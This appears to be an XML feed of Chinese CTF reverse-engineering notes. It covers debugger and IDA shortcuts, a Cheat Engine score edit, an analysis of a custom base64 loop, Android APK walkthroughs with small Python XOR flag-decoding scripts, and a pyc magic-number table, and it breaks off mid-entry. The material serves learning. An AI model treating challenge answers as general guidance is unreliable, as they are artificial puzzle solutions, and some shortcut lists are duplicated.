    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="汇编语言"><a href="#汇编语言" class="headerlink" title="汇编语言"></a>汇编语言</h1><p><a href="https://www.cnblogs.com/Reverse-xiaoyu/p/11397584.html">EFLAGS寄存器（标志寄存器） - Reverse-xiaoyu - 博客园</a></p><p><img src="/./img/5KvlLwV8VJbZ5PmQ/1731046773059-6159e1d0-0938-40ab-be9b-b02beae4dadf-014361.png" alt="1731046773059-6159e1d0-0938-40ab-be9b-b02beae4dadf.png"></p><blockquote><p>更新: 2024-11-08 14:20:35<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/aua67b8t0qvzecvg">https://www.yuque.com/chaye-apqbl/vsc85q/aua67b8t0qvzecvg</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h1 id="数据提取"><a href="#数据提取" class="headerlink" title="数据提取"></a>数据提取</h1><p>shift+e</p><p>或者设置断点，动调查看栈的内容（更好用）</p><blockquote><p>更新: 2024-11-13 17:23:17<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/yuyyz92iihx1uu9n">https://www.yuque.com/chaye-apqbl/vsc85q/yuyyz92iihx1uu9n</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E5%BF%AB%E6%8D%B7%E9%94%AE/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h1><h1 id="od"><a href="#od" class="headerlink" title="od"></a>od</h1><p>快捷键功能</p><p>F7单步步进，遇到call指令跟进</p><p>F8单步步过，不跟进</p><p>F9运行</p><p>ctrl + F9知道出现ret指令时中断，运行到程序返回</p><p>alt + F9进入内核中后，执行此命令，可以瞬间返回用户态</p><p>F2打断点</p><p>F4直接诶运行到光标所在处</p><p>ctrl + F2重新加载可执行文件，重新运行</p><p>ctrl + N查找当前程序调用动态链接库的API列表，然后打断点</p><p>Alt + M显示内存，可以看到很多段，并附有每个段的访问、读、写、执行属性</p><p>F2当显示内存后，使用F2直接打内存访问一次性断点</p><p>shift + F2设置条件断点</p><p>shift + F4打开条件断点窗口</p><p>原文链接：<a href="https://blog.csdn.net/passiones/article/details/103927414">https://blog.csdn.net/passiones/article/details/103927414</a></p><h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><p>shift + e 提取数据</p><p>shift+F2 写脚本</p><p>ctrl+&#x2F; 单行注释</p><p>ctrl+shift+&#x2F; 块注释</p><p>ctrl+shift+ +&#x2F;- 展开&#x2F;折叠</p><p>ctrl+alt+L 格式化代码</p><p>ctrl+shift+ up&#x2F;down 上下移动句子</p><p>Shift+F6 重构-重命名</p><pre><code class="hljs"> 合并数据</code></pre><p>x交叉引用</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>Alt+回车 导入包,自动修正</p><p>Ctrl+N 查找类</p><p>Ctrl+Shift+N 查找文件</p><p>Ctrl+Alt+L 格式化代码</p><p>Ctrl+Alt+O 优化导入的类和包</p><p>Alt+Insert 生成代码(如get,set方法,构造函数等)</p><p>Ctrl+E或者Alt+Shift+C 最近更改的代码</p><p>Ctrl+R 替换文本</p><p>Ctrl+F 查找文本</p><p>Ctrl+Shift+Space 自动补全代码</p><p>Ctrl+空格 代码提示</p><p>Ctrl+Alt+Space 类名或接口名提示</p><p>Ctrl+P 方法参数提示</p><p>Ctrl+Shift+Alt+N 查找类中的方法或变量</p><p>Alt+Shift+C 对比最近修改的代码</p><p>Ctrl+Shift+先上键</p><p>Ctrl+X 删除行</p><p>Ctrl+D 复制行</p><p>Ctrl+&#x2F; 或 Ctrl+Shift+&#x2F; 注释（&#x2F;&#x2F; 或者&#x2F;…&#x2F; ）</p><p>Ctrl+J 自动代码</p><p>Ctrl+E 最近打开的文件</p><p>Ctrl+H 显示类结构图</p><p>Ctrl+Q 显示注释文档</p><p>Alt+F1 查找代码所在位置</p><p>Alt+1 快速打开或隐藏工程面板</p><p>Ctrl+Alt+ left&#x2F;right 返回至上次浏览的位置</p><p>Alt+ left&#x2F;right 切换代码视图</p><p>Alt+ Up&#x2F;Down 在方法间快速移动定位</p><p>Ctrl+Shift+Up&#x2F;Down 代码向上&#x2F;下移动。</p><p>F2 或Shift+F2 高亮错误或警告快速定位</p><p>代码标签输入完成后，按Tab，生成代码。</p><p>选中文本，按Ctrl+Shift+F7 ，高亮显示所有该文本，按Esc高亮消失。</p><p>Ctrl+W 选中代码，连续按会有其他效果</p><p>选中文本，按Alt+F3 ，逐个往下查找相同文本，并高亮显示。</p><p>Ctrl+Up&#x2F;Down 光标跳转到第一行或最后一行下</p><p>Ctrl+B 快速打开光标处的类或方法</p><p>默认配置下的常用快捷键</p><p>查找&#x2F;代替</p><p>ctrl+shift+N 通过文件名快速查找工程内的文件（必记）</p><p>ctrl+shift+alt+N 通过一个字符快速查找位置（必记）</p><p>ctrl+F 在文件内快速查找代码</p><p>F3 查找下一个</p><p>shift+F3 查找上一个</p><p>ctrl+R 文件内代码替换</p><p>ctrl+shift+R 指定目录内代码批量替换</p><p>ctrl+shift+F 指定目录内代码批量查找</p><p>ctrl+R 文件内代码替换</p><p>界面操作</p><p>ctrl+shift+A 快速查找并使用编辑器所有功能（必记）</p><p>alt+[0-9] 快速拆合功能界面模块</p><p>ctrl+shift+F12 最大区域显示代码（会隐藏其他的功能界面模块）</p><p>alt+shift+F 将当前文件加入收藏夹</p><p>ctrl+alt+s 打开配置窗口</p><p>ctrl+tab 切换代码选项卡（还要进行此选择，效率差些）</p><p>alt+&lt;-或-&gt; 切换代码选项卡</p><p>ctrl+shift+N 通过文件名快速查找工程内的文件（必记）</p><p>ctrl+shift+alt+N 通过一个字符快速查找位置（必记）</p><p>ctrl+F 在文件内快速查找代码</p><p>F3 查找下一个</p><p>shift+F3 查找上一个</p><p>ctrl+R 文件内代码替换</p><p>ctrl+shift+R 指定目录内代码批量替换</p><p>ctrl+shift+F 指定目录内代码批量查找</p><p>ctrl+R 文件内代码替换</p><p>界面操作</p><p>ctrl+shift+A 快速查找并使用编辑器所有功能（必记）</p><p>alt+[0-9] 快速拆合功能界面模块</p><p>ctrl+shift+F12 最大区域显示代码（会隐藏其他的功能界面模块）</p><p>alt+shift+F 将当前文件加入收藏夹</p><p>ctrl+alt+s 打开配置窗口</p><p>ctrl+tab 切换代码选项卡（还要进行此选择，效率差些）</p><p>alt+&lt;-或-&gt; 切换代码选项卡</p><p>ctrl+F4 关闭当前代码选项卡</p><p>代码编辑</p><p>ctrl+D 复制当前行</p><p>ctrl+W 选中单词</p><p>ctrl+&lt;-或-&gt; 以单词作为边界跳光标位置</p><p>alt+Insert 新建一个文件或其他</p><p>ctrl+alt+L 格式化代码</p><p>shift+tab&#x2F;tab 减少&#x2F;扩大缩进（可以在代码中减少行缩进）</p><p>ctrl+Y 删除一行</p><p>shift+enter 重新开始一行（无论光标在哪个位置）</p><p>导航</p><p>esc 进入代码编辑区域</p><p>alt+F1 查找代码在其他界面模块的位置，颇为有用</p><p>ctrl+G 到指定行的代码</p><p>ctrl+]&#x2F;[ 光标到代码块的前面或后面</p><p>alt+up&#x2F;down 上一个&#x2F;下一个方法</p><p>建议配置版本控制快捷键</p><p>ctrl+C 提交代码</p><p>ctrl+p 向远程版本库推送更新</p><p>ctrl+G 到指定行的代码</p><p>ctrl+]&#x2F;[ 光标到代码块的前面或后面</p><p>alt+up&#x2F;down 上一个&#x2F;下一个方法</p><p>原文链接：<a href="https://blog.csdn.net/weixin_43860634/article/details/132063380">https://blog.csdn.net/weixin_43860634&#x2F;article&#x2F;details&#x2F;132063380</a></p><blockquote><p>更新: 2025-04-08 20:26:32<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/as3gug4bi4p76507">https://www.yuque.com/chaye-apqbl/vsc85q/as3gug4bi4p76507</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/index/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/index/</url>
    
    <content type="html"><![CDATA[<h1 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h1><blockquote><p>更新: 2024-11-13 14:45:15<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ckecfh0xavgge4fe">https://www.yuque.com/chaye-apqbl/vsc85q/ckecfh0xavgge4fe</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/CE%E4%BF%AE%E6%94%B9/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/CE%E4%BF%AE%E6%94%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="CE修改"><a href="#CE修改" class="headerlink" title="CE修改"></a>CE修改</h1><h2 id="1、例题xctf"><a href="#1、例题xctf" class="headerlink" title="1、例题xctf"></a>1、例题xctf</h2><p>打开程序，然后导入进程</p><p><img src="/./img/ClQMGGXCCydwxzMZ/1741420665714-df4e734e-f3f1-4af2-809f-6ee59fe5991e-959228.png" alt="1741420665714-df4e734e-f3f1-4af2-809f-6ee59fe5991e.png"></p><p><img src="/./img/ClQMGGXCCydwxzMZ/1741420775473-21b90458-be8c-47ef-a337-93448a377689-217639.png" alt="1741420775473-21b90458-be8c-47ef-a337-93448a377689.png"></p><p>修改分数即可过关</p><p><img src="/./img/ClQMGGXCCydwxzMZ/1741420939109-4f2dd98d-097f-4a40-bb52-89ed0a4784a3-649096.png" alt="1741420939109-4f2dd98d-097f-4a40-bb52-89ed0a4784a3.png">\</p><blockquote><p>更新: 2025-03-11 23:45:36<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wdnkcfd4zx834x2x">https://www.yuque.com/chaye-apqbl/vsc85q/wdnkcfd4zx834x2x</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/base%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/base%E5%8A%A0%E5%AF%86%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="base加密过程"><a href="#base加密过程" class="headerlink" title="base加密过程"></a>base加密过程</h1><h2 id="base64-（变表）"><a href="#base64-（变表）" class="headerlink" title="base64    （变表）"></a>base64    （变表）</h2><p>三个字节转成四个可打印字符</p><p><img src="/./img/uzz3PL4BDh0eAFBX/1741067367608-a7ed6078-758d-4cb0-9b19-88bee3dae434-302211.png" alt="1741067367608-a7ed6078-758d-4cb0-9b19-88bee3dae434.png"></p><p>do</p><p>{</p><p>v10 &#x3D; *(v6 - 1);</p><p>v9 +&#x3D; 4;</p><p>v6 +&#x3D; 3;</p><p>*(v9 - 6) &#x3D; aZyxabcdefghijk[(unsigned __int64)v10 &gt;&gt; 2];</p><p>v11 &#x3D; (unsigned __int8)*(v6 - 3);</p><p>v12 &#x3D; v11 &amp; 0xF;</p><p>v13 &#x3D; (16i64 * (v10 &amp; 3)) | (v11 &gt;&gt; 4);</p><p>v14 &#x3D; (unsigned __int8)*(v6 - 2);</p><p>*(v9 - 5) &#x3D; aZyxabcdefghijk[v13];</p><p>*(v9 - 4) &#x3D; aZyxabcdefghijk[((unsigned __int64)v14 &gt;&gt; 6) | (unsigned int)(4 * v12)];</p><p>*(v9 - 3) &#x3D; aZyxabcdefghijk[v14 &amp; 0x3F];</p><p>–v7;</p><p>}</p><p>while ( v7 );</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs smali"><br>这段代码是循环处理输入数据，每3字节转换为4个字符。具体来说：<br><br>1. `v6`和`v9`分别指向输入和输出的缓冲区，每次处理3字节输入（v6 +=3），生成4字节输出（v9 +=4）。<br><br>2. 使用位操作将3个8位字节转换为4个6位索引。<br><br>3. 通过查表`aZyxabcdefghijk`将6位索引转换为对应的Base64字符。<br><br>例如，第一个字符是取第一个字节的高6位（v10 &gt;&gt; 2），第二个字符结合第一个字节的低2位和第二个字节的高4位，以此类推。这些都是标准Base64编码的步骤，只是字符表不同。<br><br>因此，可以确定这段do-while循环就是Base64编码的过程。用户可能希望确认这一点，并理解具体的实现细节。需要注意字符表是否被正确识别，以及是否存在其他可能的混淆点，比如变量命名或额外的操作干扰判断。<br><br>在提供的代码中，**Base64编码的核心逻辑**体现在以下代码段：<br><br>---<br><br><span class="hljs-comment">### **关键代码段分析（Base64编码过程）**</span><br>c<br><br>```plain<br>// 编码循环（处理3字节输入，生成4字节Base64输出）<br>do &#123;<br>    v10 = *(v6 - 1);               // 取输入的第一个字节<br>    v9 += 4;                       // 输出指针后移4字节（准备写入4个字符）<br>    v6 += 3;                       // 输入指针后移3字节（处理下一个3字节组）<br>    <br>    // 第一个字符：取第一个字节的高6位（右移2位）<br>    *(v9 - 6) = aZyxabcdefghijk[(unsigned __int64)v10 &gt;&gt; 2];<br>    <br>    // 第二个字符：第一个字节低2位（掩码0x03）左移4位 | 第二个字节高4位（右移4位）<br>    v11 = (unsigned __int8)*(v6 - 3);<br>    v12 = v11 &amp; 0xF;               // 保留第二个字节的低4位（后续用）<br>    v13 = (16i64 * (v10 &amp; 3)) | (v11 &gt;&gt; 4); // 组合低2位和高4位<br>    *(v9 - 5) = aZyxabcdefghijk[v13];<br>    <br>    // 第三个字符：第二个字节低4位左移2位 | 第三个字节高2位（右移6位）<br>    v14 = (unsigned __int8)*(v6 - 2);<br>    *(v9 - 4) = aZyxabcdefghijk[((unsigned __int64)v14 &gt;&gt; 6) | (unsigned int)(4 * v12)];<br>    <br>    // 第四个字符：第三个字节低6位（掩码0x3F）<br>    *(v9 - 3) = aZyxabcdefghijk[v14 &amp; 0x3F];<br>    <br>    --v7;                         // 循环控制变量<br>&#125; while (v7);<br></code></pre></td></tr></table></figure><hr><h3 id="代码行为解读"><a href="#代码行为解读" class="headerlink" title="代码行为解读"></a><strong>代码行为解读</strong></h3><ol><li><strong>输入分组</strong>：<br>每轮循环处理 <strong>3字节输入</strong>（<code>v6 += 3</code>），生成 <strong>4字节输出</strong>（<code>v9 += 4</code>），符合Base64编码的 <strong>3 → 4 字节转换规则</strong>。</li><li><strong>位操作逻辑</strong>：<ul><li><strong>第一个输出字符</strong>：取输入的第一个字节的高6位（<code>v10 &gt;&gt; 2</code>）。</li><li><strong>第二个输出字符</strong>：组合第一个字节的低2位（<code>v10 &amp; 0x03</code>）和第二个字节的高4位（<code>v11 &gt;&gt; 4</code>）。</li><li><strong>第三个输出字符</strong>：组合第二个字节的低4位（<code>v11 &amp; 0x0F</code>）和第三个字节的高2位（<code>v14 &gt;&gt; 6</code>）。</li><li><strong>第四个输出字符</strong>：取第三个字节的低6位（<code>v14 &amp; 0x3F</code>）。</li></ul></li><li><strong>字符映射表</strong>：<br>通过查表 <code>aZyxabcdefghijk</code> 将6位索引转换为字符，表明这是一个 <strong>自定义Base64字符表</strong>（可能与标准表顺序不同）。</li></ol><hr><h3 id="验证示例"><a href="#验证示例" class="headerlink" title="验证示例"></a><strong>验证示例</strong></h3><p>假设输入为三个字节 <code>0x41 0x42 0x43</code>（ASCII “ABC”），编码步骤如下：</p><ol><li><strong>第一个字符</strong>：<code>0x41 &gt;&gt; 2 = 0x10</code> → 查表得到字符。</li><li><strong>第二个字符</strong>：<code>(0x41 &amp; 0x03) &lt;&lt; 4 | (0x42 &gt;&gt; 4) = 0x01 &lt;&lt; 4 | 0x04 = 0x14</code> → 查表。</li><li><strong>第三个字符</strong>：<code>(0x42 &amp; 0x0F) &lt;&lt; 2 | (0x43 &gt;&gt; 6) = 0x02 &lt;&lt; 2 | 0x00 = 0x08</code> → 查表。</li><li><strong>第四个字符</strong>：<code>0x43 &amp; 0x3F = 0x03</code> → 查表。</li></ol><p>若字符表为 <code>aZyxabcdefghijk</code>，需确认其实际顺序是否与标准Base64表 <code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> 不同。</p><hr><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>这段代码是典型的 <strong>自定义Base64编码实现</strong>，关键特征包括：</p><ul><li>3字节输入 → 4字节输出。</li><li>6位分段和位组合逻辑。</li><li>查表映射到自定义字符集 <code>aZyxabcdefghijk</code>。</li></ul><blockquote><p>更新: 2025-03-04 13:50:29<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/erqlr2pw6dvzoleu">https://www.yuque.com/chaye-apqbl/vsc85q/erqlr2pw6dvzoleu</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h1><p><a href="https://blog.csdn.net/shadow20080578/article/details/124982792">https://blog.csdn.net/shadow20080578/article/details/124982792</a></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><blockquote><p>更新: 2025-03-07 14:54:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/rmi4mvf1gmnlnei8">https://www.yuque.com/chaye-apqbl/vsc85q/rmi4mvf1gmnlnei8</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/index/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/index/</url>
    
    <content type="html"><![CDATA[<h1 id="安卓逆向"><a href="#安卓逆向" class="headerlink" title="安卓逆向"></a>安卓逆向</h1><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p>拿到先放入exeinfor看一下，发现是一个zip文件，那么直接修改后缀名，解压得到apk文件</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721272211836-2854087c-1178-4c71-8ad2-9a422154f984-389420.png" alt="1721272211836-2854087c-1178-4c71-8ad2-9a422154f984.png"></p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721272280625-a6a99f17-eebe-4f12-a389-35ec64d820fd-272454.png" alt="1721272280625-a6a99f17-eebe-4f12-a389-35ec64d820fd.png"></p><p>然后放入jadx进行反编译</p><p><font style="color:rgb(17, 17, 17);">activity_main.xml通常是在Android应用程序的</font><strong><font style="color:rgb(17, 17, 17);">res&#x2F;layout目录</font></strong><font style="color:rgb(17, 17, 17);">下。 如果您使用Android Studio进行开发，您可以在项目文件夹的app&#x2F;src&#x2F;main&#x2F;res&#x2F;layout&#x2F;目录中找到它。 如果您无法找到它，您可以在Android Studio的项目窗口中展开app &gt; src &gt; main &gt; res &gt; layout目录来查看是否存在activity_main.xml文件。</font></p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721271174826-6b58a770-db23-4c5e-885e-07aed9b3b769-987077.png" alt="1721271174826-6b58a770-db23-4c5e-885e-07aed9b3b769.png"></p><p>然后可以找到Mainactivity</p><p>或者也可以直接搜索Main</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721271248315-c0f849c4-1245-4979-8cbc-cfabc551aca7-509527.png" alt="1721271248315-c0f849c4-1245-4979-8cbc-cfabc551aca7.png"></p><p>然后点进mainactivity，可以找到关键加密词</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721271850390-cb3cd3b4-8a07-4fe3-b671-53c4f0ec03ca-969938.png" alt="1721271850390-cb3cd3b4-8a07-4fe3-b671-53c4f0ec03ca.png"></p><p>注意这里的key被改掉了，从123456789改成987654321</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721271882425-2d7cd9f4-e3ad-4cf3-9044-6987b2216768-901985.png" alt="1721271882425-2d7cd9f4-e3ad-4cf3-9044-6987b2216768.png"></p><p>跟进encode，然后逆向一下得到flag</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721271369384-fed8a416-d878-45c4-97dd-4cb57f8279a2-394102.png" alt="1721271369384-fed8a416-d878-45c4-97dd-4cb57f8279a2.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=&#x27;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&#x27;<br>flag=&#x27;&#x27;<br>key=987654321<br>for i in range(len(a)):<br>    flag+=chr((ord(a[i])^key)%128)<br>print(flag)<br></code></pre></td></tr></table></figure><p>这里解释一下为什么要取余</p><p><font style="color:#000000;background-color:#FFFFFF;">这是因为ASCII字符集只有128个字符，所以如果不取模，那么异或运算的结果可能超出ASCII范围，导致无法正确解密。取模128可以保证结果在0到127之间，也就是ASCII字符集的有效范围。</font></p><p>如果不取余就会出现超出ASCII的范围</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1721272017307-d9c771ea-ec6b-4a3e-8e34-06b130ae492a-275389.png" alt="1721272017307-d9c771ea-ec6b-4a3e-8e34-06b130ae492a.png"></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1729348511465-bbe57147-2b2e-4c44-95b5-1fc582e1ae41-853988.png" alt="1729348511465-bbe57147-2b2e-4c44-95b5-1fc582e1ae41.png"></p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1729348544033-c0425354-1aa8-4297-91dd-0318a3b63126-920384.png" alt="1729348544033-c0425354-1aa8-4297-91dd-0318a3b63126.png"></p><p>在代码中，<code>2 00</code> 的来源是这一行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><br>Integer.valueOf((<span class="hljs-type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION)<br><br></code></pre></td></tr></table></figure><p>点进入看一下这个值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">a=[404, 220, 436, 368, 220, 436, 412, 452, 432, 200, 412]<br>b=&#x27;ccadwjlyah&#x27;<br>for i in range(len(a)):<br>    x=(a[i]&gt;&gt;2)^3<br>    print(chr(x),end=&#x27;&#x27;)<br>mima=&#x27;f4n_4ndro1d&#x27;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1729593547829-3cc63230-5557-496c-8c82-eac41ac54741-946539.png" alt="1729593547829-3cc63230-5557-496c-8c82-eac41ac54741.png"></p><p>放到蓝叠模拟器运行一下</p><p><img src="/./img/49277317_W-UlKYkFp658qZr1/1729348655383-a3bf5ff7-0757-48c8-be83-13d39642876a-116114.png" alt="1729348655383-a3bf5ff7-0757-48c8-be83-13d39642876a.png"></p><blockquote><p>更新: 2024-10-22 18:40:23<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/fi66anigo3t9upnz">https://www.yuque.com/chaye-apqbl/vsc85q/fi66anigo3t9upnz</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/python%E9%80%86%E5%90%91%EF%BC%88pyc%E6%96%87%E4%BB%B6%EF%BC%89%E4%BE%8B%E9%A2%98/"/>
    <url>/2026/01/19/RE/%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/python%E5%8F%8D%E7%BC%96%E8%AF%91/python%E9%80%86%E5%90%91%EF%BC%88pyc%E6%96%87%E4%BB%B6%EF%BC%89%E4%BE%8B%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="python逆向（pyc文件）例题"><a href="#python逆向（pyc文件）例题" class="headerlink" title="python逆向（pyc文件）例题"></a>python逆向（pyc文件）例题</h1><h1 id="3-8以上用pycdc"><a href="#3-8以上用pycdc" class="headerlink" title="3.8以上用pycdc"></a>3.8以上用pycdc</h1><p><a href="https://blog.csdn.net/m0_73644864/article/details/135038499?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172241258516800225543557%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172241258516800225543557&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-135038499-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=kali%E4%B8%8Apycdc%E5%AE%89%E8%A3%85&spm=1018.2226.3001.4187">pycdc配置和使用-CSDN博客</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h1 id="Python逆向全版本MagicNumber表-python3-11-4-magicnumber-CSDN博客"><a href="#Python逆向全版本MagicNumber表-python3-11-4-magicnumber-CSDN博客" class="headerlink" title="Python逆向全版本MagicNumber表_python3.11.4 magicnumber-CSDN博客"></a><a href="https://blog.csdn.net/OrientalGlass/article/details/134612786">Python逆向全版本MagicNumber表_python3.11.4 magicnumber-CSDN博客</a></h1><h1 id="例题（正常的py逆向）"><a href="#例题（正常的py逆向）" class="headerlink" title="例题（正常的py逆向）"></a><font style="color:#000000;background-color:#FAFAFA;">例题（正常的py逆向）</font></h1><p>enum PycMagic {</p><pre><code class="hljs">MAGIC_1_0 = 0x00999902,MAGIC_1_1 = 0x00999903, /* Also covers 1.2 */MAGIC_1_3 = 0x0A0D2E89,MAGIC_1_4 = 0x0A0D1704,MAGIC_1_5 = 0x0A0D4E99,MAGIC_1_6 = 0x0A0DC4FC,MAGIC_2_0 = 0x0A0DC687,MAGIC_2_1 = 0x0A0DEB2A,MAGIC_2_2 = 0x0A0DED2D,MAGIC_2_3 = 0x0A0DF23B,MAGIC_2_4 = 0x0A0DF26D,MAGIC_2_5 = 0x0A0DF2B3,MAGIC_2_6 = 0x0A0DF2D1,MAGIC_2_7 = 0x0A0DF303,MAGIC_3_0 = 0x0A0D0C3A,MAGIC_3_1 = 0x0A0D0C4E,MAGIC_3_2 = 0x0A0D0C6C,MAGIC_3_3 = 0x0A0D0C9E,MAGIC_3_4 = 0x0A0D0CEE,MAGIC_3_5 = 0x0A0D0D16,MAGIC_3_5_3 = 0x0A0D0D17,MAGIC_3_6 = 0x0A0D0D33,MAGIC_3_7 = 0x0A0D0D42,MAGIC_3_8 = 0x0A0D0D55,MAGIC_3_9 = 0x0A0D0D61,MAGIC_3_10 = 0x0A0D0D6F,MAGIC_3_11 = 0x0A0D0DA7,MAGIC_3_12 = 0x0A0D0DCB,INVALID = 0,</code></pre><p>};</p><h2 id="1、ezpy"><a href="#1、ezpy" class="headerlink" title="1、ezpy"></a>1、ezpy</h2><p><font style="color:#000000;background-color:#FAFAFA;">exeinfope查壳，观察到pyinstaller字眼</font></p><p><img 